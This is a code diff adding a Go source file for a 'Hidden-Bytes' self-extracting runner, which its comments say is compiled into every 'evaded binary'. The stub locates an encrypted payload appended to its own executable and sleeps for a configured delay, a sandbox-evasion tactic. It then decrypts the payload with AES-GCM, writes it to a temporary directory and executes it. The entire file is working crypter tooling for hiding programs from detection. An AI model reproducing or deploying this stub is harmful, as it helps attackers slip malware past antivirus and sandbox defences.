@@ -1,0 +1,117 @@
+// Self-extracting runner compiled into every evaded binary.
+// Reads its own executable, finds the encrypted payload appended
+// after itself, enforces the configured delay, decrypts, and runs
+// the original program.
+//
+// Output layout (read from the end):
+//   [stub .exe] [zero padding] [ciphertext] [JSON meta] [metaLen 4B] ["HBX1"]
+package main
+
+import (
+	"crypto/aes"
+	"crypto/cipher"
+	"encoding/base64"
+	"encoding/binary"
+	"encoding/json"
+	"fmt"
+	"os"
+	"os/exec"
+	"path/filepath"
+	"time"
+)
+
+const magic = "HBX1"
+
+type meta struct {
+	Key           string  `json:"key"`
+	Nonce         string  `json:"nonce"`
+	Delay         float64 `json:"delay"`
+	OriginalName  string  `json:"original_name"`
+	OriginalSize  int     `json:"original_size"`
+	CiphertextLen int     `json:"ciphertext_len"`
+}
+
+func main() {
+	fmt.Fprintln(os.Stderr, "[INFO] Hidden-Bytes self-extracting runner.")
+
+	exePath, err := os.Executable()
+	if err != nil {
+		fatal("cannot locate self: %v", err)
+	}
+	data, err := os.ReadFile(exePath)
+	if err != nil {
+		fatal("cannot read self: %v", err)
+	}
+
+	n := len(data)
+	if n < 8 || string(data[n-4:]) != magic {
+		fatal("not a valid Hidden-Bytes runner")
+	}
+
+	metaLen := int(binary.BigEndian.Uint32(data[n-8 : n-4]))
+	if n < 8+metaLen {
+		fatal("corrupted runner file")
+	}
+
+	var m meta
+	if err := json.Unmarshal(data[n-8-metaLen:n-8], &m); err != nil {
+		fatal("corrupted metadata: %v", err)
+	}
+
+	ctEnd := n - 8 - metaLen
+	ctStart := ctEnd - m.CiphertextLen
+	if ctStart < 0 {
+		fatal("ciphertext extends beyond file")
+	}
+	ciphertext := data[ctStart:ctEnd]
+
+	if m.Delay > 0 {
+		fmt.Fprintf(os.Stderr, "[INFO] Execution delayed by %.0f seconds...\n", m.Delay)
+		time.Sleep(time.Duration(m.Delay * float64(time.Second)))
+	}
+
+	key, _ := base64.StdEncoding.DecodeString(m.Key)
+	nonce, _ := base64.StdEncoding.DecodeString(m.Nonce)
+
+	block, err := aes.NewCipher(key)
+	if err != nil {
+		fatal("cipher: %v", err)
+	}
+	gcm, err := cipher.NewGCM(block)
+	if err != nil {
+		fatal("gcm: %v", err)
+	}
+	plaintext, err := gcm.Open(nil, nonce, ciphertext, []byte(magic))
+	if err != nil {
+		fatal("decryption failed — wrong key or corrupted file")
+	}
+	if len(plaintext) != m.OriginalSize {
+		fatal("size mismatch after decryption")
+	}
+
+	fmt.Fprintln(os.Stderr, "[INFO] Binary decrypted successfully.")
+
+	tmpDir, err := os.MkdirTemp("", "hbx-")
+	if err != nil {
+		fatal("temp dir: %v", err)
+	}
+	defer os.RemoveAll(tmpDir)
+
+	target := filepath.Join(tmpDir, m.OriginalName)
+	if err := os.WriteFile(target, plaintext, 0o755); err != nil {
+		fatal("write payload: %v", err)
+	}
+
+	fmt.Fprintln(os.Stderr, "[INFO] Target program executed.")
+
+	cmd := exec.Command(target)
+	cmd.Stdout = os.Stdout
+	cmd.Stderr = os.Stderr
+	cmd.Stdin = os.Stdin
+	cmd.Run()
+}
+
+func fatal(format string, args ...interface{}) {
+	fmt.Fprintf(os.Stderr, "[ERROR] "+format+"\n", args...)
+	os.Exit(1)
+}
